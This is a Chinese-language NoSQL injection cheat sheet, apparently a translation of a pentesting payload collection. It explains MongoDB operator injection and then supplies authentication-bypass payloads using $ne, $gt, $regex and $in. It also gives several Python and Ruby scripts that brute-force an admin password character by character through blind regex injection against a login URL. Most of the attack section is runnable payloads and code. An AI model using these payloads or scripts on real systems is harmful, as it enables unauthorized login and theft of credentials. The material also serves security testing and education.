# NoSQL 注入

> NoSQL 数据库比传统 SQL 数据库提供了更宽松的一致性限制。通过减少关系约束和一致性检查的需求，NoSQL 数据库通常能带来性能和扩展性的优势。然而，即使这些数据库不使用传统的 SQL 语法，它们仍然可能容易受到注入攻击的威胁。

## 概述

* [工具](#工具)
* [方法论](#方法论)
    * [操作符注入](#操作符注入)
    * [绕过身份验证](#绕过身份验证)
    * [提取长度信息](#提取长度信息)
    * [提取数据信息](#提取数据信息)
    * [WAF 和过滤器](#WAF和过滤器)
* [盲注 NoSQL](#盲注Nosql)
    * [POST 请求带 JSON 主体](#POST请求带JSON主体)
    * [POST 请求带 urlencoded 主体](#POST请求带urlencoded主体)
    * [GET 请求](#GET请求)
* [实验室](#参考文献)
* [参考文献](#参考文献)

## 工具

* [codingo/NoSQLmap](https://github.com/codingo/NoSQLMap) - 自动化的 NoSQL 数据库枚举和 Web 应用程序漏洞利用工具
* [digininja/nosqlilab](https://github.com/digininja/nosqlilab) - 用于实验 NoSQL 注入的实验室
* [matrix/Burp-NoSQLiScanner](https://github.com/matrix/Burp-NoSQLiScanner) - 这个插件提供了一种发现 NoSQL 注入漏洞的方法。

## 方法论

当攻击者通过向 NoSQL 数据库查询中注入恶意输入来操纵查询时，就会发生 NoSQL 注入。与 SQL 注入不同，NoSQL 注入通常会利用基于 JSON 的查询和 MongoDB 中的操作符，如 `$ne`、`$gt`、`$regex` 或 `$where`。

### 操作符注入

| 操作符 | 描述        |
| -------- | ------------------ |
| $ne      | 不等于          |
| $regex   | 正则表达式 |
| $gt      | 大于       |
| $lt      | 小于         |
| $nin     | 不在             |

示例：一个 Web 应用程序有一个产品搜索功能

```js
db.products.find({ "price": userInput })
```

攻击者可以注入一个 NoSQL 查询：`{ "$gt": 0 }`。

```js
db.products.find({ "price": { "$gt": 0 } })
```

这不会返回特定的产品，而是返回所有价格大于零的产品，泄露数据。

### 绕过身份验证

使用不等于 (`$ne`) 或大于 (`$gt`) 的基本身份验证绕过

* HTTP 数据

  ```ps1
  username[$ne]=toto&password[$ne]=toto
  login[$regex]=a.*&pass[$ne]=lol
  login[$gt]=admin&login[$lt]=test&pass[$ne]=1
  login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
  ```

* JSON 数据

  ```json
  {"username": {"$ne": null}, "password": {"$ne": null}}
  {"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
  {"username": {"$gt": undefined}, "password": {"$gt": undefined}}
  {"username": {"$gt":""}, "password": {"$gt":""}}
  ```

### 提取长度信息

使用 `$regex` 操作符注入负载。当长度正确时，注入将起作用。

```ps1
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}
```

### 提取数据信息

使用 "`$regex`" 查询操作符提取数据。

* HTTP 数据

  ```ps1
  username[$ne]=toto&password[$regex]=m.{2}
  username[$ne]=toto&password[$regex]=md.{1}
  username[$ne]=toto&password[$regex]=mdp

  username[$ne]=toto&password[$regex]=m.*
  username[$ne]=toto&password[$regex]=md.*
  ```

* JSON 数据

  ```json
  {"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
  {"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
  {"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
  ```

使用 "`$in`" 查询操作符提取数据。

```json
{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
```

### WAF 和过滤器

**移除前置条件**：

在 MongoDB 中，如果文档中包含重复键，则只有最后一个键的值会生效。

```js
{"id":"10", "id":"100"} 
```

在这种情况下，"id" 的最终值将是 "100"。

## 盲注 NoSQL

### POST 请求带 JSON 主体

Python 脚本：

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://example.org/login"
headers={'content-type': 'application/json'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if 'OK' in r.text or r.status_code == 302:
                print("Found one more char : %s" % (password+c))
                password += c
```

### POST 请求带 urlencoded 主体

Python 脚本：

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://example.org/login"
headers={'content-type': 'application/x-www-form-urlencoded'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|','&','$']:
            payload='user=%s&pass[$regex]=^%s&remember=on' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if r.status_code == 302 and r.headers['Location'] == '/dashboard':
                print("Found one more char : %s" % (password+c))
                password += c
```

### GET 请求

Python 脚本：

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username='admin'
password=''
u='http://example.org/login'

while True:
  for c in string.printable:
    if c not in ['*','+','.','?','|', '#', '&', '$']:
      payload=f"?username={username}&password[$regex]=^{password + c}"
      r = requests.get(u + payload)
      if 'Yeah' in r.text:
        print(f"Found one more char : {password+c}")
        password += c
```

Ruby 脚本：

```ruby
require 'httpx'

username = 'admin'
password = ''
url = 'http://example.org/login'
# CHARSET = (?!..?~).to_a # 所有 ASCII 可打印字符
CHARSET = [*'0'..'9',*'a'..'z','-'] # 数字字母加'-'
GET_EXCLUDE = ['*','+','.','?','|', '#', '&', '$']
session = HTTPX.plugin(:persistent)

while true
  CHARSET.each do |c|
    unless GET_EXCLUDE.include?(c)
      payload = "?username=#{username}&password[$regex]=^#{password + c}"
      res = session.get(url + payload)
      if res.body.to_s.match?('Yeah')
        puts "Found one more char : #{password + c}"
        password += c
      end
    end
  end
end
```

## 实验室

* [Root Me - NoSQL 注入 - 身份验证](https://www.root-me.org/en/Challenges/Web-Server/NoSQL-injection-Authentication)
* [Root Me - NoSQL 注入 - 盲注](https://www.root-me.org/en/Challenges/Web-Server/NoSQL-injection-Blind)

## 参考文献

* [Burp-NoSQLiScanner - matrix - 2021 年 1 月 30 日](https://github.com/matrix/Burp-NoSQLiScanner/blob/main/src/burp/BurpExtender.java)
* [在 NoSQL 注入中消除前置和后置条件 - Reino Mostert - 2025 年 3 月 11 日](https://sensepost.com/blog/2025/getting-rid-of-pre-and-post-conditions-in-nosql-injections/)
* [经典的和盲注的 NoSQL 注入：永远不要信任用户输入 - Geluchat - 2015 年 2 月 22 日](https://www.dailysecurity.fr/nosql-injections-classique-blind/)
* [使用聚合管道的 MongoDB NoSQL 注入 - Soroush Dalili (@irsdl) - 2024 年 6 月 23 日](https://soroush.me/blog/2024/06/mongodb-nosql-injection-with-aggregation-pipelines/)
* [基于错误的 NoSQL 注入 - Reino Mostert - 2025 年 3 月 15 日](https://sensepost.com/blog/2025/nosql-error-based-injection/)
* [MongoDB 中的 NoSQL 注入 - Zanon - 2016 年 7 月 17 日](https://zanon.io/posts/nosql-injection-in-mongodb)
* [NoSQL 注入词表 - cr0hn - 2021 年 5 月 5 日](https://github.com/cr0hn/nosqlinjection_wordlists)
* [测试 NoSQL 注入 - OWASP - 2023 年 5 月 2 日](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)